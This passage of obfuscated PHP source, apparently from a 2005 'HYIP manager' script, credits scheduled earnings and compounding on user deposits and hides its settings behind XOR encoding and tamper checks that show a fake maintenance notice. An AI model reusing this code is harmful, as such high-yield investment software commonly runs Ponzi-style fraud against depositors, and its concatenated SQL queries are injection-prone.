            $elnlcGupOi = 'Deposit return';
            if ($elnlcgVDB[$elnlchyuw['elnlcznDu']] != 0)
            {
              $elnlcqbWqO = floor ($elnlcIHmju[$elnlchyuw['elnlcCNVKJ']] * (100 - $elnlcgVDB[$elnlchyuw['elnlcznDu']])) / 100;
              $elnlcGupOi = '' . 'Deposit return. ' . $elnlcgVDB[$elnlchyuw['elnlcznDu']] . '% holded.';
            }

            $q = 'insert into hm2_history set
                user_id = ' . $elnlcIHmju[$elnlchyuw['elnlciorSe']] . ',
      		amount = ' . $elnlcqbWqO . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $elnlcqbWqO . ',
                ec = ' . $elnlcIHmju[$elnlchyuw['elnlcmhRT']] . ',
      		date = \'' . $elnlcIHmju[$elnlchyuw['elnlcRKCW']] . ('' . '\' + interval ' . $elnlcMelGk . ' ') . ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'] ? 'hour' : 'day') . ',
                deposit_id = ' . $elnlcIHmju[$elnlchyuw['elnlclRBWS']] . ('' . ',
                description = \'' . $elnlcGupOi . '\'');
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $elnlcqnMW . ' and 
    	       (deposit_date + interval ' . $elnlcMelGk . ' ' . ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'] ? 'hour' : 'day') . ('' . ' < last_pay_date or deposit_date + interval ' . $elnlcMelGk . ' ') . ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'] ? 'hour' : 'day') . ('' . ' < now()) and
             ((' . $elnlcgVDB[$elnlchyuw['elnlcNRnay']] . ' = 0) || (' . $elnlcgVDB[$elnlchyuw['elnlcNRnay']] . ' && (deposit_date + interval ' . $elnlcgVDB[$elnlchyuw['elnlciehD']] . ' ') . ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'] ? 'hour' : 'day') . ('' . ' < now()))) and
             type_id = ' . $elnlcluDIv . '
           ');
        (mysql_query ($q) OR print mysql_error ());
      }

      flock ($elnlcBxNVs, LOCK_UN);
      fclose ($elnlcBxNVs);
      unlink ('' . './tmpl_c/lock_user' . $elnlcqnMW);
    }

  }

  function elnlclgnt ($elnlcgRoE)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    $elnlcQAUMy = array ();
    if (($elnlcTcyic[$elnlchyuw['elnlceOAv']] == 1 AND $elnlcgRoE != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($elnlcTpvVW = mysql_query ($q) OR print mysql_error ());
    while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
    {
      $elnlcQAUMy[$elnlcgVDB[$elnlchyuw['elnlckLNre']]][$elnlcgVDB[$elnlchyuw['elnlclRBWS']]] = $elnlcgVDB;
    }

    $elnlccSkk = $elnlchyuw['elnlchcRPc'];
    $elnlcdxRaC = 'u.last_access_time + interval 30 minute < now() ';
    if ($elnlcgRoE == -1)
    {
      $elnlcdxRaC = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcgRoE . ' and status = \'on\'';
    }

    if ($elnlcgRoE == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($elnlcubIy = mysql_query ($q) OR print mysql_error ());
    while ($elnlcnnAak = mysql_fetch_array ($elnlcubIy))
    {
      $elnlcqnMW = $elnlcnnAak[$elnlchyuw['elnlclRBWS']];
      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $elnlcqnMW;
      (mysql_query ($q) OR print mysql_error ());
      $elnlccSkk = $elnlchyuw['elnlchcRPc'];
      while (0 < $elnlccSkk)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              t.return_profit as return_profit
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $elnlcqnMW . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              (((t.q_days + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / (60*60*24))) or t.q_days = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((t.q_days = 0) or 
                (               
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date  and t.period = \'h\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date  and t.period = \'d\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (t.q_days > 0 and t.period = \'end\') 
              ))';
        ($elnlcTpvVW = mysql_query ($q) OR print mysql_error ());
        $elnlccSkk = $elnlchyuw['elnlcRjwtU'];
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          ++$elnlccSkk;
          if (!isset ($elnlcQAUMy[$elnlcgVDB[$elnlchyuw['elnlcqvnw']]]))
          {
            continue;
          }

          $elnlcjtAF = $elnlchyuw['elnlcRjwtU'];
          $elnlcormLb = $elnlchyuw['elnlcRjwtU'];
          reset ($elnlcQAUMy);
          reset ($elnlcQAUMy[$elnlcgVDB[$elnlchyuw['elnlcqvnw']]]);
          while (list ($elnlcuNse, $elnlckWdOt) = each ($elnlcQAUMy[$elnlcgVDB[$elnlchyuw['elnlcqvnw']]]))
          {
            if (($elnlckWdOt[$elnlchyuw['elnlcroIG']] <= $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] AND ($elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] <= $elnlckWdOt[$elnlchyuw['elnlcHcrf']] OR $elnlckWdOt[$elnlchyuw['elnlcHcrf']] == 0)))
            {
              $elnlcjtAF = $elnlckWdOt[$elnlchyuw['elnlchJOG']];
            }

            if (($elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] < $elnlckWdOt[$elnlchyuw['elnlcroIG']] AND $elnlcjtAF == 0))
            {
              $elnlcjtAF = $elnlcormLb;
            }

            if (($elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] < $elnlckWdOt[$elnlchyuw['elnlcroIG']] AND 0 < $elnlcjtAF))
            {
              break;
            }

            $elnlcormLb = $elnlckWdOt[$elnlchyuw['elnlchJOG']];
          }

          if (($elnlckWdOt[$elnlchyuw['elnlcHcrf']] != 0 AND $elnlckWdOt[$elnlchyuw['elnlcHcrf']] < $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']]))
          {
            $elnlcjtAF = $elnlcormLb;
          }

          $elnlcGHPa = $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] * $elnlcjtAF / 100;
          $elnlcqaPE = '';
          if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcqoGF'])
          {
            $elnlcqaPE = ' 1 day ';
          }
          else
          {
            if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'])
            {
              $elnlcqaPE = ' 1 hour ';
            }
            else
            {
              if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcEVvN'])
              {
                $elnlcqaPE = ' 7 day ';
              }
              else
              {
                if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == 'b-w')
                {
                  $elnlcqaPE = ' 14 day ';
                }
                else
                {
                  if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlctcSD'])
                  {
                    $elnlcqaPE = ' 1 month ';
                  }
                  else
                  {
                    if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcFzMrx'])
                    {
                      $elnlcqaPE = ' 2 month ';
                    }
                    else
                    {
                      if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcnBKly'])
                      {
                        $elnlcqaPE = ' 3 month ';
                      }
                      else
                      {
                        if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcuOjHR'])
                        {
                          $elnlcqaPE = ' 6 month ';
                        }
                        else
                        {
                          if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcfRnSo'])
                          {
                            $elnlcqaPE = ' 1 year ';
                          }
                          else
                          {
                            if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlconHe'])
                            {
                              $elnlcqaPE = ' ' . $elnlcgVDB[$elnlchyuw['elnlcjawPm']] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($elnlcjtAF == 0 AND $elnlcqaPE == ''))
          {
            continue;
          }

          $elnlcUWNOd = -1;
          $q = 'select weekday(\'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ') as dw');
          ($elnlcmzhES = mysql_query ($q) OR print mysql_error ());
          while ($elnlcdruD = mysql_fetch_array ($elnlcmzhES))
          {
            $elnlcUWNOd = $elnlcdruD[$elnlchyuw['elnlcWWFTf']];
          }

          $q = 'select count(id) as col from hm2_history where ' . ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'] ? ' date_format(date, \'%Y-%m-%d  %H\') = date_format(\'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ', \'%Y-%m-%d  %H\') and') : 'to_days(date) = to_days(\'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ') and ')) . ' deposit_id = ' . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
          ($elnlcOqBH = mysql_query ($q) OR print mysql_error ());
          $elnlcwUyle = $elnlchyuw['elnlcRjwtU'];
          while ($elnlcsOvF = mysql_fetch_array ($elnlcOqBH))
          {
            $elnlcwUyle = $elnlcsOvF[$elnlchyuw['elnlchGQKt']];
          }

          if ($elnlcwUyle == 0)
          {
            if ((5 <= $elnlcUWNOd AND $elnlcgVDB[$elnlchyuw['elnlcRlQE']] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($elnlcUWNOd == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ',
                    ec = ') . $elnlcgVDB[$elnlchyuw['elnlcmhRT']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']] . ('' . ',
                    amount = ' . $elnlcGHPa . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $elnlcTcyic[$elnlchyuw['elnlcrihr']] . number_format ($elnlcgVDB[$elnlchyuw['elnlcCNVKJ']], 2) . ('' . ' - ' . $elnlcjtAF . ' %\',
                    actual_amount = ' . $elnlcGHPa . ',
                    date = \'') . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ',
                    ec = ') . $elnlcgVDB[$elnlchyuw['elnlcmhRT']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
            }
          }

          (mysql_query ($q) OR print mysql_error ());
          $elnlcMsNcL = '';
          if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlconHe'])
          {
            if (($elnlcgVDB[$elnlchyuw['elnlcNRnay']] == 0 OR ($elnlcgVDB[$elnlchyuw['elnlcNRnay']] AND $elnlcgVDB[$elnlchyuw['elnlcQIUK']])))
            {
              $elnlcMsNcL = ', status = \'off\'';
            }

            if (($elnlcgVDB[$elnlchyuw['elnlcybqr']] == 1 AND ($elnlcgVDB[$elnlchyuw['elnlcNRnay']] == 0 OR ($elnlcgVDB[$elnlchyuw['elnlcNRnay']] AND $elnlcgVDB[$elnlchyuw['elnlcQIUK']]))))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']] . ',
                    amount = ' . $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] . ',
                    ec = ' . $elnlcgVDB[$elnlchyuw['elnlcmhRT']] . ',
                    date = \'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ',
                    deposit_id = ') . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
              (mysql_query ($q) OR print mysql_error ());
            }
          }
          else
          {
            if ((5 <= $elnlcUWNOd AND $elnlcgVDB[$elnlchyuw['elnlcRlQE']] == 1))
            {
            }
            else
            {
              if (((0 < $elnlcgVDB[$elnlchyuw['elnlcStyIm']] AND $elnlcgVDB[$elnlchyuw['elnlcStyIm']] <= 100) AND $elnlcgVDB[$elnlchyuw['elnlcFhrHQ']] == 1))
              {
                if ($elnlcgVDB[$elnlchyuw['elnlcsWIGP']] == 0)
                {
                  $elnlcgVDB[$elnlchyuw['elnlcsWIGP']] = $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] + 1;
                }

                if (($elnlcgVDB[$elnlchyuw['elnlcNsiAD']] <= $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] AND $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] <= $elnlcgVDB[$elnlchyuw['elnlcsWIGP']]))
                {
                  if ($elnlcgVDB[$elnlchyuw['elnlcQSjJt']] == 1)
                  {
                    $elnlcpqAJt = preg_split ('/\\s*,\\s*/', $elnlcgVDB[$elnlchyuw['elnlclUSEx']]);
                    if (!in_array ($elnlcgVDB[$elnlchyuw['elnlcStyIm']], $elnlcpqAJt))
                    {
                      $elnlcgVDB[$elnlchyuw['elnlcStyIm']] = $elnlcpqAJt[0];
                    }
                  }
                  else
                  {
                    if ($elnlcgVDB[$elnlchyuw['elnlcStyIm']] < $elnlcgVDB[$elnlchyuw['elnlcWDayO']])
                    {
                      $elnlcgVDB[$elnlchyuw['elnlcStyIm']] = $elnlcgVDB[$elnlchyuw['elnlcWDayO']];
                    }

                    if ($elnlcgVDB[$elnlchyuw['elnlclTMy']] < $elnlcgVDB[$elnlchyuw['elnlcStyIm']])
                    {
                      $elnlcgVDB[$elnlchyuw['elnlcStyIm']] = $elnlcgVDB[$elnlchyuw['elnlclTMy']];
                    }
                  }
                }
                else
                {
                  $elnlcgVDB[$elnlchyuw['elnlcStyIm']] = $elnlchyuw['elnlcRjwtU'];
                }

                if ((0 < $elnlcgVDB[$elnlchyuw['elnlcStyIm']] AND $elnlcgVDB[$elnlchyuw['elnlcStyIm']] <= 100))
                {
                  $elnlcVdjzK = $elnlcGHPa * $elnlcgVDB[$elnlchyuw['elnlcStyIm']] / 100;
                  $elnlcGHPa = floor ((floor ($elnlcGHPa * 100000) / 100000 - floor ($elnlcVdjzK * 100000) / 100000) * 100) / 100;
                  $q = 'insert into hm2_history set user_id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']] . ('' . ',
                        amount = -' . $elnlcVdjzK . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $elnlcVdjzK . ',
                    		ec = ') . $elnlcgVDB[$elnlchyuw['elnlcmhRT']] . ',
                    		date = \'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ',
                                deposit_id = ') . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = '' . 'update hm2_deposits set amount = amount + ' . $elnlcVdjzK . ',
                    		actual_amount = actual_amount + ' . $elnlcVdjzK . '
                    		where id = ' . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
                  (mysql_query ($q) OR print mysql_error ());
                }
              }

              elnlctygcv ($elnlcgVDB[$elnlchyuw['elnlclRBWS']], $elnlcGHPa, 'date = \'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $elnlcqaPE . ' ' . $elnlcMsNcL . ' where id =' . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $q = 'select * from hm2_types where q_days > 0';
      $elnlcTpvVW = mysql_query ($q);
      while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
      {
        $elnlcMelGk = $elnlcgVDB[$elnlchyuw['elnlcjawPm']] + $elnlcgVDB[$elnlchyuw['elnlcnhppU']] - (0 < $elnlcgVDB[$elnlchyuw['elnlcnhppU']] ? 1 : 0);
        $elnlcluDIv = $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
        if ($elnlcgVDB[$elnlchyuw['elnlcybqr']] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $elnlcluDIv . ' and 
                status = \'on\' and 
                user_id = ' . $elnlcqnMW . ' and 
                (deposit_date + interval ' . $elnlcMelGk . ' day < last_pay_date or deposit_date + interval ' . $elnlcMelGk . ' day < now()) and
                ((' . $elnlcgVDB[$elnlchyuw['elnlcNRnay']] . ' = 0) || (' . $elnlcgVDB[$elnlchyuw['elnlcNRnay']] . ' && (deposit_date + interval ' . $elnlcgVDB[$elnlchyuw['elnlciehD']] . ' day < now())))
             ';
          $elnlcGvCo = mysql_query ($q);
          while ($elnlcIHmju = mysql_fetch_array ($elnlcGvCo))
          {
            $q = 'insert into hm2_history set
                user_id = ' . $elnlcIHmju[$elnlchyuw['elnlciorSe']] . ',
      		amount = ' . $elnlcIHmju[$elnlchyuw['elnlcCNVKJ']] . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $elnlcIHmju[$elnlchyuw['elnlcCNVKJ']] . ',
                      ec = ' . $elnlcIHmju[$elnlchyuw['elnlcmhRT']] . ',
      		date = \'' . $elnlcIHmju[$elnlchyuw['elnlcRKCW']] . ('' . '\' + interval ' . $elnlcMelGk . ' day,
                      deposit_id = ') . $elnlcIHmju[$elnlchyuw['elnlclRBWS']];
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $elnlcqnMW . ' and 
    	       (deposit_date + interval ' . $elnlcMelGk . ' day < last_pay_date or deposit_date + interval ' . $elnlcMelGk . ' day < now()) and
             ((' . $elnlcgVDB[$elnlchyuw['elnlcNRnay']] . ' = 0) || (' . $elnlcgVDB[$elnlchyuw['elnlcNRnay']] . ' && (deposit_date + interval ' . $elnlcgVDB[$elnlchyuw['elnlciehD']] . ' day < now()))) and
             type_id = ' . $elnlcluDIv . '
           ';
        (mysql_query ($q) OR print mysql_error ());
      }
    }

  }

  function elnlcrtkt ($a)
  {
    global $elnlchyuw;
    if ($a != 'hyip manager pro 2005 jul 26')
    {
      exit ();
    }

    if (!file_exists ('settings.php'))
    {
      return array ();
    }

    $elnlcCiLc = file ($elnlchyuw['elnlcRBad']);
    $t = chop ($elnlcCiLc[1]);
    $elnlcboRn = strlen ($t) / 2;
    for ($i = $elnlchyuw['elnlcRjwtU']; $i < strlen ($t); $i += 2)
    {
      $d[$i / 2] = substr ($t, $i, 2);
      $d[$i / 2] = chr (hexdec ($d[$i / 2]) ^ 65);
    }

    $k = '';
    $elnlcgMRHC = elnlceuglx (0, $elnlcboRn, $d);
    $j = $elnlcboRn;
    while (10 < $j)
    {
      $elnlcgMRHC = elnlceuglx ($elnlcgMRHC, $elnlcboRn, $d);
      $k .= $d[$elnlcgMRHC];
      $d[$elnlcgMRHC] = -1;
      --$j;
    }

    $z = chr (1) . chr (1) . chr (1);
    list ($k, $z) = split ('' . $z, $k, 2);
    list ($elnlcNjbz, $elnlcOkPBw, $k) = split (':', $k, 3);
    if ($elnlcNjbz != md5 ($k))
    {
      print 'Settings are broken. Contact developers please';
      exit ();
    }

    if ($elnlcOkPBw = !md5 ($elnlcNjbz . $elnlcxIcB))
    {
      print 'Settings are broken. Contact developers please';
      exit ();
    }

    $z = unserialize ($k);
    $z[time_dif] = sprintf ('%d', $z[$elnlchyuw['elnlctOCF']]);
    $elnlcAUkp = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', $elnlchyuw['elnlcreKEb']);
    $z[$elnlchyuw['elnlcxDsl']] = $elnlcAUkp[$z[$elnlchyuw['elnlcMStmB']] - 1];
    if ($z[$elnlchyuw['elnlcuEwG']] == 1)
    {
      $z[$elnlchyuw['elnlcEbTh']] = sprintf ('%d', (time () - mktime (0, 0, 0, $z[$elnlchyuw['elnlcMStmB']], $z[$elnlchyuw['elnlcQLtzo']], $z[$elnlchyuw['elnlckkrn']])) / 86400);
    }

    $z[$elnlchyuw['elnlcNFopz']] = ($z[$elnlchyuw['elnlcUVMgi']] ? 1 : 0);
    $z[$elnlchyuw['elnlchpte']] = $z[$elnlchyuw['elnlcBCPuS']];
    return $z;
  }

  function elnlctmsf ()
  {
    global $elnlchyuw;
    $elnlcBzEo = $elnlchyuw['elnlcRjwtU'];
    if (file_exists ('./tmpl_c/.htdata'))
    {
      $elnlcBzEo = $elnlchyuw['elnlchcRPc'];
    }

    $s = array ();
    $elnlcCiLc = fopen ($elnlchyuw['elnlcODOjj'], $elnlchyuw['elnlcaAgd']);
    if ($elnlcCiLc)
    {
      while ($elnlcqNpgJ = fgets ($elnlcCiLc, 20000))
      {
        $elnlcqNpgJ = chop ($elnlcqNpgJ);
        if (($elnlcqNpgJ != '<?/*' AND $elnlcqNpgJ != '*/?>'))
        {
          $elnlcVEvtM = $elnlczBqH = '';
          list ($elnlcVEvtM, $elnlczBqH) = @split ('	', $elnlcqNpgJ, 2);
          if (((preg_match ('/^key|^cnf/', $elnlcVEvtM) AND $elnlcBzEo == 1) OR $elnlcBzEo == 0))
          {
            $s[$elnlcVEvtM] = $elnlczBqH;
            continue;
          }

          continue;
        }
      }
    }

    fclose ($elnlcCiLc);
    if ($elnlcBzEo == 1)
    {
      list ($elnlcqNpgJ, $elnlcyBNM) = file ($elnlchyuw['elnlcILgW']);
      $elnlcuhSNG = $elnlcqNpgJ;
      $elnlcREWd = $elnlchyuw['elnlcRjwtU'];
      for ($i = $elnlchyuw['elnlcRjwtU']; $i < strlen ($elnlcuhSNG); $i += 5)
      {
        $elnlcREWd += hexdec (substr ($elnlcuhSNG, $i, 5));
      }

      if ($s[$elnlchyuw['elnlcAFeeG']] != $elnlcREWd * 15)
      {
        print '<!-- Settings are broken. Please e-mail to script developers as soon as possible -->';
        print 'System maintenance and hardware upgrades.';
        exit ();
      }

      $elnlcqNpgJ = elnlctikpg ($elnlcqNpgJ, $s[$elnlchyuw['elnlcHPIo']]);
      $elnlcHGsJk = split ('
', $elnlcqNpgJ);
      for ($i = $elnlchyuw['elnlcRjwtU']; $i < sizeof ($elnlcHGsJk); ++$i)
      {
        list ($elnlcVEvtM, $elnlczBqH) = split ('	', $elnlcHGsJk[$i], 2);
        $s[$elnlcVEvtM] = $elnlczBqH;
      }
    }

    $elnlcAUkp = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', $elnlchyuw['elnlcreKEb']);
    $s[$elnlchyuw['elnlcxDsl']] = $elnlcAUkp[$s[$elnlchyuw['elnlcMStmB']] - 1];
    if ($s[$elnlchyuw['elnlcuEwG']] == 1)
    {
      $s[$elnlchyuw['elnlcEbTh']] = sprintf ('%d', (time () - mktime (0, 0, 0, $s[$elnlchyuw['elnlcMStmB']], $s[$elnlchyuw['elnlcQLtzo']], $s[$elnlchyuw['elnlckkrn']])) / 86400);
    }

    $s[$elnlchyuw['elnlctOCF']] = sprintf ('%d', $s[$elnlchyuw['elnlctOCF']]);
    $s[$elnlchyuw['elnlcNFopz']] = ($s[$elnlchyuw['elnlcUVMgi']] ? 1 : 0);
    $s[$elnlchyuw['elnlchpte']] = $s[$elnlchyuw['elnlcBCPuS']];
    return $s;
  }

  function elnlcqcwbo ($a)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    if ($a != 'hyip manager pro 2005 jul 26')
    {
      exit ();
    }

    $elnlcxIcB = serialize ($elnlcTcyic);
    $elnlcNjbz = md5 ($elnlcxIcB);
    $elnlcOkPBw = md5 ($elnlcNjbz . $elnlcxIcB);
    $elnlcxIcB = $elnlcNjbz . ':' . $elnlcOkPBw . ':' . $elnlcxIcB;
    $elnlcxIcB .= chr (1) . chr (1) . chr (1);
    $elnlcboRn = strlen ($elnlcxIcB) + 121;
    $elnlcgMRHC = rand (1, 100000000000) % $elnlcboRn;
    $elnlcmTOm = array ();
    $d = array ();
    for ($i = $elnlchyuw['elnlcRjwtU']; $i < $elnlcboRn; ++$i)
    {
      $d[$i] = -1;
      $elnlcmTOm[$i] = -1;
    }

    $elnlcgMRHC = elnlcooor (0, $elnlcboRn, $d);
    for ($i = $elnlchyuw['elnlcRjwtU']; $i < strlen ($elnlcxIcB); ++$i)
    {
      $elnlcgMRHC = elnlcooor ($elnlcgMRHC, $elnlcboRn, $d);
      $d[$elnlcgMRHC] = substr ($elnlcxIcB, $i, 1);
    }

    for ($i = $elnlchyuw['elnlcRjwtU']; $i < $elnlcboRn; ++$i)
    {
      if ($d[$i] == -1)
      {
        $d[$i] = chr (rand (1, 253));
        continue;
      }
    }

    $elnlcCiLc = fopen ($elnlchyuw['elnlckOPl'], $elnlchyuw['elnlcAwMrp']);
    $r = array ();
    fputs ($elnlcCiLc, '<?
');
    for ($i = $elnlchyuw['elnlcRjwtU']; $i < $elnlcboRn; ++$i)
    {
      fputs ($elnlcCiLc, sprintf ('%02x', ord ($d[$i]) ^ 65));
    }

    fputs ($elnlcCiLc, '
?>');
    fclose ($elnlcCiLc);
  }

  function elnlchzzol ()
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    if (!is_writeable ('settings.php'))
    {
      print '<br><br><br><br><center><h1>Your settings has not been saved.<br>Please set 666 permissions for <b>settings.php</b> file!<br>';
      exit ();
    }

    if (file_exists ('tmpl_c/.htdata'))
    {
      if (!is_writeable ('tmpl_c/.htdata'))
      {
        print '<br><br><br><br><center><h1>Your settings has not been saved.<br>Please set 666 permissions for <b>tmpl_c/.htdata</b> file!<br>';
        exit ();
      }
    }

    $elnlcBzEo = $elnlchyuw['elnlcRjwtU'];
    if (file_exists ('tmpl_c/.htdata'))
    {
      $elnlcBzEo = $elnlchyuw['elnlchcRPc'];
    }

    $elnlcCiLc = fopen ($elnlchyuw['elnlcODOjj'], $elnlchyuw['elnlcAwMrp']);
    reset ($elnlcTcyic);
    fputs ($elnlcCiLc, '<?/*
');
    $elnlcuhSNG = '';
    while (list ($elnlcVEvtM, $elnlczBqH) = each ($elnlcTcyic))
    {
      if ($elnlcVEvtM != 'logged')
      {
        if (($elnlcBzEo == 0 OR ($elnlcBzEo == 1 AND preg_match ('/^key/', $elnlcVEvtM))))
        {
          if (!preg_match ('/_generated/', $elnlcVEvtM))
          {
            fputs ($elnlcCiLc, (('' . $elnlcVEvtM . '	') . $elnlczBqH . '
'));
            $elnlcuhSNG .= (('' . $elnlcVEvtM . '	') . $elnlczBqH . '
');
          }
        }

